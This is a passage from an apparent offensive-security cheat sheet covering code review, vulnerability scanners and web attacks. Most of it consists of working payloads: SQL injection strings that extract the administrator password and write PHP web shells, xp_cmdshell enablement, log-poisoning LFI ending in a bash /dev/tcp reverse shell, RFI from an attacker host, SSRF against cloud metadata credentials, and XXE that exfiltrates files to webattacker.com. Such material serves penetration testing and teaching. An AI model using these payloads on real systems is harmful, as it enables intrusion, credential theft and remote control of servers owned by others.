  - many API keys start with the same format (ex. AWS keys usually start with `AKIA`), search for patterns
    <img src="img/Screenshot_20221110_171255.png">
	from [ServletTarPit.java](https://github.com/ShiftLeftSecurity/tarpit-java/blob/master/src/main/java/io/shiftleft/tarpit/ServletTarPit.java), [Tarpit Java](https://github.com/ShiftLeftSecurity/tarpit-java)
- Search for weak cryptography or hashing algorithms
- Search for outdated dependencies
- Search for revealing comments

**Digging deeeper**
- Prioritize functions like authentication, autorization, PII etc.
  - example: disclosing PII in the logs, from [OrderStatus.java](https://github.com/ShiftLeftSecurity/tarpit-java/blob/master/src/main/java/io/shiftleft/tarpit/OrderStatus.java)
    <img src="img/Screenshot_20221110_172648.png">
  - example: SQL injection in [OrderStatus.java](https://github.com/ShiftLeftSecurity/tarpit-java/blob/master/src/main/java/io/shiftleft/tarpit/OrderStatus.java)
    <img src="img/Screenshot_20221110_173028.png">
- Follow any code that deals with user input

**Automation**
- Use SAST tools
- Use SCA tools
- Use secret scanners
- Then test the results manually

**Resources**
- [How to Analyze Code for Vulnerabilities](https://www.youtube.com/watch?v=A8CNysN-lOM)
- [OWASP Code Review Guide](https://owasp.org/www-project-code-review-guide/)
- [Tarpit Java](https://github.com/ShiftLeftSecurity/tarpit-java)
- [TruffleHog](https://github.com/trufflesecurity/trufflehog)
- [GitLeaks](https://github.com/zricethezav/gitleaks)
- [Visual Studio Code](https://code.visualstudio.com/) for Source Code Analysis
- [beautifier.io](https://beautifier.io/) for JavaScript Analysis


## Vulnerability Scanning

### <ins>Nessus</ins>

[Run Nessus](https://docs.tenable.com/nessus/Content/StartOrStopNessus.htm) and navigate to `http://localhost:8834`

**Defining targets**<br/>
Top-right, click "New Scan"
- Basic Network Scan: general scan containing a number of tests that may be used against different target types
  - Arguments: a name for the scan and a list of targets (an IP address, an IP range, or comma-delimited FQDN or IP list)
- Credentialed Patch Audit: authenticated scan that enumerates missing patches
- Web Application Tests: specialized scan for locating published Web application security vulnerabilities
- Spectre and Meltdown: targeted scan for [Meltdown](https://en.wikipedia.org/wiki/Meltdown_(security_vulnerability)) and [Spectre](https://en.wikipedia.org/wiki/Spectre_(security_vulnerability)) vulnerabilities

**Configuring scan definitions**<br/>
- Ports to scan
  - In "Discovery" > "Scan Type" you can change the ports to scan
  - "Discovery" > "Port Scanning" to select more specific options
- Turn off Host discovery (save time and scan more quietly)
  - "Discovery" > "Host Discovery" under the "Settings" tab > deselect "Ping the remote host"

**Authenticated scanning**<br/>
From a new scan, click in the "Credentials" tab.

**Scanning with Individual Nessus Plugins**<br/>
From the "Plugins tab" you can select multiple options (a family of plugin) in the left column or one by one in the right column.

### <ins>Nmap</ins>

NSE scripts can be found in the `/usr/share/nmap/scripts/` directory. Here you can find `script.db`, a file that serves as an index to all of the scripts.
- Check also: [CVE-2021-41773 NSE Script](https://github.com/RootUp/PersonalStuff/blob/master/http-vuln-cve-2021-41773.nse)
  - `sudo nmap -sV -p 443 --script "http-vuln-cve2021-41773" <IP>`


**How to add new scripts**
1. Copy the file in `/usr/share/nmap/scripts/`
2. `sudo nmap --script-updatedb`

**Grep for scripts in the "vuln" and "exploit" categories**<br/>
`cat script.db | grep '"vuln"\|"exploit"'`

**Using NSE's "vuln" scripts**<br/>
`sudo nmap --script vuln <IP>`

### <ins>Nikto</ins>

You can find it here: [sullo/nikto](https://github.com/sullo/nikto).

**An example of usage**
`nikto -host=http://www.targetcorp.com -maxtime=30s`

### <ins>Nuclei</ins>

You can find it here: [projectdiscovery/nuclei](https://github.com/projectdiscovery/nuclei). See also: "[The Ultimate Guide to Finding Bugs With Nuclei by ProjectDiscovery](https://blog.projectdiscovery.io/ultimate-nuclei-guide/)"

**Automatic Selection**<br/>
`nuclei -u http://target.io -as`

**Check for Technologies**<br/>
`%USERPROFILE%\nuclei-templates\technologies`

**Check for more: misconfiguration, CVEs and CNVD**<br/>
`-t %USERPROFILE%\nuclei-templates\misconfiguration -t %USERPROFILE%\nuclei-templates\cves -t %USERPROFILE%\nuclei-templates\cnvd`

**Use it in a workflow**<br/>
`cat subdomains.txt | httpx | nuclei -t technologies`

**Use tags combined with automatic selection**<br/>
`nuclei -l list.txt -as -tags log4j -o output.txt`

**Check for: takeovers, .git exposed, crlf-injection, swaggers, exposed panels and old copyrights**<br/>
`nuclei -l target.txt -t %USERPROFILE%/nuclei-templates/takeovers -t %USERPROFILE%/nuclei-templates/exposures/configs/git-config.yaml -t %USERPROFILE%/nuclei-templates/vulnerabilities/generic/crlf-injection.yaml -t %USERPROFILE%/nuclei-templates/exposures/apis/swagger-api.yaml -t %USERPROFILE%/nuclei-templates/exposed-panels -t %USERPROFILE%/nuclei-templates/miscellaneous/old-copyright.yaml -stats -o output/nuclei_target`

**Check for log4j**<br/>
`nuclei -l target.txt -as -tags log4j,cve -stats -o output/nuclei_2_target`

## Web vulnerabilities

### <ins>SQL Injection</ins>

#### <ins>Introduction</ins>

**Tools**
- [SQL injection cheat sheet  | PortSwigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [SQL Injection cheat sheets | pentestmonkey](https://pentestmonkey.net/category/cheat-sheet/sql-injection)
- [SQL Injection cheat sheets | ihack4falafel](https://github.com/ihack4falafel/OSCP/blob/master/Documents/SQL%20Injection%20Cheatsheet.md)
- [sqlmapproject/sqlmap](https://github.com/sqlmapproject/sqlmap)
- [Ghauri](https://github.com/r0oth3x49/ghauri)

**MySQL**
- `mysql -u root -p'root' -h <IP> -P 3306` connect to the database
- `select version();` retrieve the db version
- `select system_user();` inspecting the current session's user
- `show databases;` list all available databases
  - `USE databasetmp` use the `databasetmp` database
  - `SHOW TABLES`
- `SELECT user, authentication_string FROM mysql.user WHERE user = 'rooter';` inspect user `rooter`'s encrypted password

**MSSQL**
- `impacket-mssqlclient <user>:<password>@<IP> -windows-auth` connect to remote instance via Impacket
- `SELECT @@version;` retrieve the db version
- `SELECT name FROM sys.databases;` list all available databases
- `SELECT * FROM tempdb.information_schema.tables;` inspect the available tables in the `tempdb` database
- `SELECT * from tempdb.dbo.users;`

#### <ins>Identification</ins>

**Error based**
- `' OR '1'='1`
- `' OR '1'='1' --`
- `' OR 1=1 #'`
- `' UNION SELECT NULL,NULL,NULL--`
  - add / remove NULLs to make the query work
  - on Oracle, they work differently. See PortSwigger
- `Accessories' UNION SELECT table_name, NULL FROM all_tables--`
- `Accessories' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_BIZMOI'--`
- `Accessories' UNION SELECT PASSWORD_ZRFHII, USERNAME_SCSVZM FROM USERS_BIZMOI--`
- `' UNION SELECT NULL,username||'~'||password FROM users--`
- `1 UNION SELECT username||':'||password FROM users--`

**Blind**
- First char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'm`
- Second char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 2, 1) = 'm`
- Third char: `xyz' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 3, 1) = 'm`
- etc.
- Note: it can be automated with Intruder Cluster bomb

**Blind - error based**
- `TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>3 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
  - Test length of a password
- `TrackingId=xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='a' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`

**Blind - verbose SQL errors**
- `CAST((SELECT example_column FROM example_table) AS int)`
- `Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--`
- `Cookie: TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--`
- `Cookie: TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--`

**Blind - time based**
- `'; IF (1=1) WAITFOR DELAY '0:0:10';--`
- `'; IF (1=2) WAITFOR DELAY '0:0:10';--`
- `'; IF ((select count(name) from sys.tables where name = 'users')=1) WAITFOR DELAY '0:0:10';--`
  - testing the existence of the table users
- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name = 'username')=1) WAITFOR DELAY '0:0:10';--`
  - testing the existence of the column username
- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' and c.name like 'pass%')=1) WAITFOR DELAY '0:0:10';--`
  - testing the presence of another column, in this case, searching if it starts with pass. Using % you can test letter by letter
- `'; IF ((select count(c.name) from sys.columns c, sys.tables t where c.object_id = t.object_id and t.name = 'users' )>3) WAITFOR DELAY '0:0:10';--`
  - see how may columns there are in the db
- `'; IF (SELECT COUNT(Username) FROM Users WHERE Username = 'butch' AND password_hash='8' WAITFOR DELAY '0:0:5'--`
  - discover password_hash
- `'; update users set password_hash = 'tacos123' where username = 'butch';--`
  - try update an user creds
  - verify the success of it with the query `'; IF ((select count(username) from users where username = 'butch' and password_hash = 'tacos123')=1) WAITFOR DELAY '0:0:10';--`
  - for the hash, try various combination (md5sum, sha1sum, sha256sum): `echo -n 'tacos123' | md5sum`
    - `'; update users set password_hash = '6183c9c42758fa0e16509b384e2c92c8a21263afa49e057609e3a7fb0e8e5ebb' where username = 'butch';--`
- See exploit https://www.exploit-db.com/exploits/47013

**Blind - delay with conditions**
- `x'%3b SELECT CASE WHEN 1=1 THEN pg_sleep(10) ELSE pg_sleep(0) END--`
- `x'%3b SELECT CASE WHEN (LENGTH(password)=20) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`
- `x'%3b SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--`
  - to automate this: Resource pool > New resource pool with Max Concurrent requests = 1

**DNS lookup**
- `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://wggnzi1futt3lvlzdsfuiwfdg4mvapye.oastify.com/"> %remote;]>'),'/l') FROM dual--`
- `x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.chx30y2vv9ujmbmfe8gajcgthknbb6zv.oastify.com/"> %remote;]>'),'/l') FROM dual--`
- `' OR 1=1 ; exec master.dbo.xp_dirtree '\\192.168.49.239\test';--`
  - Useful with `sudo responder -I tun0` to take hashes from Windows OS

**HTML Encoding**
- `&#49;&#32;&#79;&#82;&#32;&#49;&#61;&#49;&#32;&#45;&#45;`
- https://mothereff.in/html-entities
  
#### <ins>Notes</ins>

- If you find path / slug you might find an SQLi
- `' UNION SELECT ("<?php echo system($_GET['cmd']);") INTO OUTFILE 'C:/xampp/htdocs/command.php'  -- -'`
- `SELECT "<?php echo system($_GET['cmd']); ?>" into outfile "/var/www/html/web/backdoor.php"`
- `%27%20union%20select%20%27%3C?php%20echo%20system($_REQUEST[%22bingo%22]);%20?%3E%27%20into%20outfile%20%27/srv/http/cmd.php%27%20--%20-`

**Extract database information**
- Extract the version: `?id=1 union all select 1, 2, @@version`
- Extract the database user: `?id=1 union all select 1, 2, user()`
- Extract table names: `?id=1 union all select 1, 2, table_name from information_schema.tables`
- Extract table columns `?id=1 union all select 1, 2, column_name from information_schema.columns where table_name='users'`
- An example of extracting the `users` table: `?id=1 union all select 1, username, password from users`

**Authentication Bypass**
- `tom’ or 1=1 LIMIT 1;#`
  - `#` is a comment marker in MySQL/MariaDB
  - `LIMIT 1` is to return a fixed number of columns and avoid errors when our payload is returning multiple rows

**Insert a new user**
```SQL
insert into webappdb.users(password, username) VALUES ("backdoor","backdoor");
```

**Local File Inclusion (LFI)**<br/>
Using the `load_file` function: `?id=1 union all select 1, 2, load_file('C:/Windows/System32/drivers/etc/hosts')`

**Remote Code Execution (RCE)**
- ```SQL
  EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
  xp_cmdshell 'COMMAND';
  ```
- ```SQL
  EXEC sp_configure 'allow updates', 0
  RECONFIGURE
  EXEC sp_configure 'show advanced options', 1
  GO
  RECONFIGURE
  GO
  EXEC sp_configure 'xp_cmdshell', 1
  GO
  RECONFIGURE
  GO
  xp_cmdshell 'COMMAND';
  ```
- Write a PHP shell using the `OUTFILE` function: `?id=1 union all select 1, 2, "<?php echo shell_exec($_GET['cmd']);?>" into OUTFILE 'c:/xampp/htdocs/backdoor.php'`. Then access `backdoor.php&cmd=ipconfig`.

**sqlmap**
- ```
   > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
  		    -l (to parse a Burp log file)
  		    --parse-errors --current-db --invalid-logical --invalid-bignum --invalid-string --risk 3		  
  		    --force-ssl --threads 5 --level 1 --risk 1 --tamper=space2comment
  ```
- `sqlmap -u http://victim/page.php?param=1 -p param` test the parameter `param`
  - `sqlmap -u http://victim/page.php?param=1 -p param --dump` dump the entire database
  - Add ` -D DATABASE_NAME` and `-T TABLE_NAME` to dump a specific database/table
- `sqlmap -r request.txt -p param --os-shell` gain shell
- `sqlmap -u http://vulnerable.com --forms  --crawl=10 --level=5 --risk=3` to crawl
- `sqlmap -u http://vulnerable.com --batch` non interactive mode

**How to fix SQL injections**: Use parameterized queries/prepared statements to protect against SQL injections by isolating user input from SQL code. They add placeholders for user input in SQL statements, creating a layer of isolation and preventing user input from affecting SQL code.


### <ins>Authentication vulnerabilities</ins>

**Multi-factor authentication**
- Response manipulation, try to intercept the response and modify the status to `200`
- Status code manipulation, change the code from `4xx` to `200`
- 2FA code leakage in the response
- JS File Analysis
- 2FA Code Reusability
- Lack of Bruteforce protection
- The 2FA code can be used for any user
- CSRF on 2FA disabling
- Password reset disable 2FA
- Bypass 2FA with null or `000000`
- Access the content directly
- Login with Oauth to bypass 2FA
- If you get logged-out after failed attempts, use macros with Burp

**Password reset**
- Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token
- Try with headers like `X-Forwarded-Host:`
- Via dangling markup
  - `Host: victim.com:'<a href="//attacker.com/?`
- Insert two emails, like:
  - `email1@service.com;email2@service.com`
  - `email:["email1@service.com","email2@service.com"]`

**Rate-limit**
- Bypass with `X-Forwarded-For:127.0.0.1-1000`
- IP rotating, you can use
  - [mubeng](https://github.com/kitabisa/mubeng)
  - [Burp extension: IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
- Log in into a valid account to reset the rate-limit

**Web Cache Deception**
- Attacker send to a victim a 404 endpoint like `site.com/dir/ok.css`
- Victim click on it, the CDN cache the page
- Attacker goes to `site.com/dir/ok.css`, now it can see the page of the Victim

**Misc tests**
- [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
- [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
- Test "remember me" functionality
- PHP protections can be bypassed with `[]`, like `password=123` to `password[]=123`
- Replace password with a list of candidates, example
  ```JSON
  "username":"usertest"
  "password":[
   "123456",
   "password",
   "qwerty",
   ...
  ```
- Search for [Open Redirect](#open-redirection) in login and register
- For phpMyAdmin, check default credential `root` and blank password

### <ins>Directory Traversal</ins>

Directory traversal vulnerabilities allow an attacker to read local secret files. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb))

**Exploitations / Bypasses**
- simple case `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
- absolute path `https://insecure-website.com/loadImage?filename=/etc/passwd`
- stripped non-recursively `https://insecure-website.com/loadImage?filename=....//....//....//etc/passwd`
- superfluous URL-decode `https://insecure-website.com/loadImage?filename=..%252f..%252f..%252fetc/passwd`
- validation of start of path `https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
- validation of start of path `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`

**Search for**
- `windows\win.ini`
- `c:\windows\system32\drivers\etc\hosts`
- `etc/passwd`

### <ins>File inclusion</ins>

File inclusion vulnerabilities allow an attacker to include a file into the application’s running code. To identify these vulnerabilities, you can search for file extensions in URL query strings and common vulnerable parameters like `file`, `path` and `folder` (see [scripts/fg.rb](scripts/fg.rb)).

**Local File Inclusion (LFI)**: execute a local file

- Try `zip://`, `php://` and other wrappers
  - With `zip://` you can achieve RCE. Example: `http://192.168.190.229/index.php?file=zip:///var/www/html/uploads/upload_1692869993.zip%23php-reverse-shell.php`

Apache's access.log contamination
1. Once found a LFI, read the Apache's access.log `http://victim.com/page.php?file=<PAYLOAD>`
   - Use `C:\xampp\apache\logs\access.log` or `../../../../../../../../../var/log/apache2/access.log`
2. Notice which values from requests are saved. Contaminate Apache logs by sending this payload `<?php echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>';?>` in the User-Agent
3. Execute a RCE with `http://victim.com/page.php?file=<apache/access.log>&cmd=ipconfig`. It will load the contaminated logs and perform an RCE thanks to `shell_exec($_GET['cmd'])`
4. Run a reverse shell using a listener `nc -nvlp 4444` and in `&cmd` use `bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22`

**Remote File Inclusion (RFI)**: execute a remote file
- An example: `http://<VICTIM>/menu.php?file=http://<ATTACKER>/evil.php`

**PHP Wrappers**
- `?file=data:text/plain,hello world`
- `?file=data:text/plain,<?php echo shell_exec("dir") ?>`
- `?file=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls`
- Use the command `curl http://victim.com/index.php?page=php://filter/convert.base64-encode/resource=admin.php` to obtain the source code of `admin.php` encoded in base64. This is to not run the PHP and to fetch the source code
  - Some examples for `php://`: [PHP: php:// - Manual](https://www.php.net/manual/en/wrappers.php.php)
- [Other wrappers](https://www.php.net/manual/en/wrappers.php)

**To search**
- `/var/log/apache2/access.log`
- `/etc/passwd`
- `/etc/shadow`


### <ins>OS Command Injection</ins>

Let's say that the vulnerable endpoint it's `https://insecure-website.com/stockStatus?productID=381&storeID=29`. The provide the stock information, the application runs the command `stockpile.pl 381 29`. If there is no OS Command Injection protection, by inserting the payload `& echo abcdefg &` in `productID` it's possible to execute the command `echo`.

For blind OS Command Injections
- Time delay `& ping -c 10 127.0.0.1 &`
- Redirecting output `& whoami > /var/www/static/whoami.txt &`
- Out-of-band (OAST) techniques `& nslookup kgji2ohoyw.web-attacker.com &`

Ways of injecting OS commands
- Both Windows and Unix-based systems
  - `&`
  - `&&`
  - `|`
  - `||`
- Unix-based systems only
  - `;`
  - Newline with `0x0a` or `\n`
  - `injected command`
  - `$(injected command)`

**Resource**
- [commix-testbed](https://github.com/commixproject/commix-testbed)




### <ins>Business logic vulnerabilities</ins>

**Examples**
- Excessive trust in client-side controls
- 2FA broken logic
- Failing to handle unconventional input
- Inconsistent security controls
- Weak isolation on dual-use endpoint
- Password reset broken logic
- Insufficient workflow validation
- Flawed enforcement of business rules
- [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)
- Account Takeover via type confusion
  - Play with parameters and flags to see if you can achieve ATO



### <ins>Information Disclosure</ins>

What is information disclosure?
- Data about other users, such as usernames or financial information
- Sensitive commercial or business data
- Technical details about the website and its infrastructure

What are some examples of information disclosure?
- Revealing the names of hidden directories, their structure, and their contents via a robots.txt file or directory listing
- Providing access to source code files via temporary backups
- Explicitly mentioning database table or column names in error messages
- Unnecessarily exposing highly sensitive information, such as credit card details
- Hard-coding API keys, IP addresses, database credentials, and so on in the source code
- Hinting at the existence or absence of resources, usernames, and so on via subtle differences in application behavior
- If you need to find UUID from an email, try to register the user and see if in the response it's disclosed. [[Reference](https://twitter.com/intigriti/status/1217794181982302208)]

How do information disclosure vulnerabilities arise?
- Failure to remove internal content from public content
- Insecure configuration of the website and related technologies
- Flawed design and behavior of the application



### <ins>Access control vulnerabilities and privilege escalation</ins>

In the context of web applications, access control is dependent on authentication and session management:
- Authentication identifies the user and confirms that they are who they say they are;
- Session management identifies which subsequent HTTP requests are being made by that same user;
- Access control determines whether the user is allowed to carry out the action that they are attempting to perform.

From a user perspective, access controls can be divided into the following categories:
- Vertical access controls
  Mechanisms that restrict access to sensitive functionality that is not available to other types of users
- Horizontal access controls
  Mechanisms that restrict access to resources to the users who are specifically allowed to access those resources
- Context-dependent access controls
  Restrict access to functionality and resources based upon the state of the application or the user's interaction with it

**Tools**
- [Autorize](https://github.com/PortSwigger/autorize)
- [Authz](https://portswigger.net/bappstore/4316cc18ac5f434884b2089831c7d19e)
- [UUID Detector](https://portswigger.net/bappstore/65f32f209a72480ea5f1a0dac4f38248)
- Check also endpoints in JS files



### <ins>File upload vulnerabilities</ins>

**Upload Functions check-list**
- [ ] Check if the method `PUT` is enabled
- [ ] Integrations (from 3rd party)
  - XSS
- [ ] Self Uploads
  - XML based (Docs/PDF)
    - SSRF, XSS
  - Image
    - XSS, Shell
      - Name
      - Binary header
      - Metadata
- [ ] Where is data stored?
  - [s3 perms](#abusing-s3-bucket-permissions)
  - [GCS perms](#google-cloud-storage-bucket)
  
**Extension Splitting**
- shell.php%00.png
- shell.php%0A.png
- shell.php\n.png
- shell.php\u000a.png
- shell.php\u560a.png
- shell.php%E5%98%8A.png
- shell.php;.png
- shell.php%3B.png
- shell.php\u003b.png
- shell.php\u563b.png
- shell.php%E5%98%BB.png

**multipart/form-data POST request**
```HTTP
POST / HTTP/2
Host: example.io
Content-Type: multipart/form-data; boundary=---------------------------374598703146120535182333328
Content-Length: 342

-----------------------------374598703146120535182333328
Content-Disposition: form-data; name="key"

general
-----------------------------374598703146120535182333328
Content-Disposition: form-data; name="file"; filename="file.pdf"
Content-Type: application/pdf

$content$
-----------------------------374598703146120535182333328--
```

**Add magic bytes**

Add magic bytes at the beginning of a file to bypass restrictions
```sh
echo '89 50 4E 47 0D 0A 1A 0A' | xxd -p -r >> reverse.php.png
cat reverse.php >> reverse.php.png
```
- Useful, for example, to upload `.js` files and bypass CSP restrictions

**General tips**
- If the target creates an encrypter URL for your file, copy the domain and use the command `echo data.target.com | waybackurls | httpx -mc 200, 403`. If you find valid endpoints, it might be possible to have an information disclosure [[Reference](https://twitter.com/ADITYASHENDE17/status/1673585969411526658)]


**Resources**
- [Common MIME types](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types/Common_types)
- [ASHX shell](https://gist.github.com/merttasci/82100f2ef904dfe810416fd3cb48be5c), see [mert's tweet](https://twitter.com/mertistaken/status/1646171743206121474)
- [How I earned $500 by uploading a file: write-up of one of my first bug bounty](https://seeu-inspace.medium.com/how-i-earned-500-by-uploading-a-file-write-up-of-one-of-my-first-bug-bounty-c174cf8ea553)
- See the shells [here](shells/)


### <ins>Server-side request forgery (SSRF)</ins>

**SSRF with blacklist-based input filters bypass**
Some applications block input containing hostnames like `127.0.0.1` and localhost, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using various techniques:
- Using an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`;
- Registering your own domain name that resolves to `127.0.0.1`. You can use spoofed.burpcollaborator.net for this purpose or the domain `firefox.fr` is a DNS that point to `127.0.0.1`.;
- Obfuscating blocked strings using URL encoding or case variation.

**SSRF with whitelist-based input filters bypass**
- You can embed credentials in a URL before the hostname, using the `@` character. For example: `https://expected-host@evil-host`.
- You can use the `#` character to indicate a URL fragment. For example: `https://evil-host#expected-host`.
- You can leverage the DNS naming hierarchy to place required input into a fully-qualified DNS name that you control. For example: `https://expected-host.evil-host`.
- You can URL-encode characters to confuse the URL-parsing code. This is particularly useful if the code that implements the filter handles URL-encoded characters differently than the code that performs the back-end HTTP request.
- You can use combinations of these techniques together.

**Other tips**
- By combining it with an [Open redirection](#open-redirection), you can bypass some restrictions. [An example](https://portswigger.net/web-security/ssrf/lab-ssrf-filter-bypass-via-open-redirection): `http://vulnerable.com/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`
- For AWS, bypass some restrictions by hosting this PHP page [[Reference](https://hackerone.com/reports/508459)]
  ```PHP
  <?php header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303); ?>
  ```
- If everything fails, look for assets pointing to internal IPs. You can usually find these via CSP headers, JS files, Github, shodan/censys etc. [[Reference](https://twitter.com/bogdantcaciuc7/status/1561572514295341058)]
- [SSRF (Server Side Request Forgery) testing resources](https://github.com/cujanovic/SSRF-Testing)
- If the target runs Windows, try to steal NTLM hashes with Responder [[Reference](https://twitter.com/hacker_/status/1694554700555981176)]
  - `/vulnerable?url=http://your-responder-host`
- `<?php header('Location: file:///Users/p4yl0ad/.ssh/id_rsa');?>`

**Common endpoints**
- Webhooks
  - Try to send requests to internal resources
- PDF Generator
  - If there is an HTML Injection in a PDF generator, try call internal resources with something like `<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" title="SSRF test">`, with these tags `<img>`, `<script>`, `<base>` or with the CSS element `url()`
- Document parsers
  - If it's an XML doc, use the PDF Generator approach
  - In other scenarios, see if there is any way to reference external resources and let server make requests to internal resources
- Link expansion, [[Reference](https://twitter.com/BugBountyHQ/status/868242771617792000)]
- File uploads
  - Instead of uploading a file, upload a URL. [An example](https://hackerone.com/reports/713)
  - Use an SVG file
    ```svg
	<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
    	<image xlink:href="https://example.com/test.png"/>
	</svg>
    ```

**Common payloads**
- `http://127.0.0.1`
- `http://localhost/`
- `http://169.254.169.254/`
- `http://169.254.169.254/latest/meta-data/`
- `http://instance-data`
  - alternative to `169.254.169.254`
- `http://metadata.google.internal/`
- `https://kubernetes.default.svc/metrics` [[Random Robbie's tweet](https://twitter.com/Random_Robbie/status/1072242182306832384)]

**Resources**
- [7 SSRF Mitigation Techniques You Must Know](https://brightsec.com/blog/7-ssrf-mitigation-techniques-you-must-know/)
- [Cloud SSRF | HackTricks](https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf)
- [SSRF Cheatsheet | Cobalt](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-request-forgery-ssrf)


### <ins>Open redirection</ins>

**Bypasses**
- https://attacker.com?victim.com
- https://attacker.com;victim.com
- https://attacker.com/victim.com/../victimPATH
- https://victim.com.attacker.com
- https://attackervictim.com
- https://victim.com@attacker.com
- https://attacker.com#victim.com
- https://attacker.com\.victim.com
- https://attacker.com/.victim.com
- https://subdomain.victim.com/r/redir?url=https%3A%2F%2Fvictim.com%40ATTACKER_WEBSITE.COM?x=subdomain.victim.com%2f
- https://www.victim.com/redir/r.php?redirectUri=https://attacker%E3%80%82com%23.victim.com/
- https://www.victim.com/redir/r.php?redirectUri=/%0d/attacker.com/


### <ins>XXE injection</ins>

- **Exploiting XXE to retrieve files**<br/>
  Original
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <stockCheck><productId>381</productId></stockCheck>
  ```
  Modified
  ```xml
  <?xml version="1.0" encoding="UTF-8"?>
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
  <stockCheck><productId>&xxe;</productId></stockCheck>
  ```
- **Exploiting XXE to perform SSRF attacks**
  ```xml
  <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerablewebsite.com/"> ]>
  ```
- **Exploiting blind XXE exfiltrate data out-of-band**<br/>
  Example
  ```xml
  <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://web-attacker.com"> %xxe; ]>
  ```
- **Exfiltrate data out-of-band**<br/>
  for-the-malicious-web-server.dtd
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/hostname">
  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://webattacker.com/?x=%file;'>">
  %eval;
  %exfil;
  ```
  Submit to vulnerable server
  ```xml
  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://webattacker.com/malicious.dtd"> %xxe;]>
  ```
- **Exploiting blind XXE to retrieve data via error messages**
  ```xml
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
  ```
- **Exploiting blind XXE by repurposing a local DTD**<br/>
  Suppose there is a DTD file on the server filesystem at the location `/usr/local/app/schema.dtd`
  ```xml
  <!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
  <!ENTITY % custom_entity '
  <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
  <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM
  &#x27;file:///nonexistent/&#x25;file;&#x27;>">
  &#x25;eval;
  &#x25;error;
  '>
  %local_dtd;
  ]>
  ```
  To locate the DTD file, submit the payload
  ```xml
  <!DOCTYPE foo [
  <!ENTITY % local_dtd SYSTEM
  "file:///usr/share/yelp/dtd/docbookx.dtd">
  %local_dtd;
  ]>
  ```
- **Try with xinclude to achieve SSRF or LFI**
  ```xml
  <?xml version="1.0" encoding="utf-8" ?>
  <username xmls:xi="https://w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///c:/windows/win.ini">
  </username>
  ```

Attack surfaces
- **XInclude attacks**
  ```xml
  <foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/></foo>
  ```
- **XXE attacks via file upload with** `.svg`
  ```svg
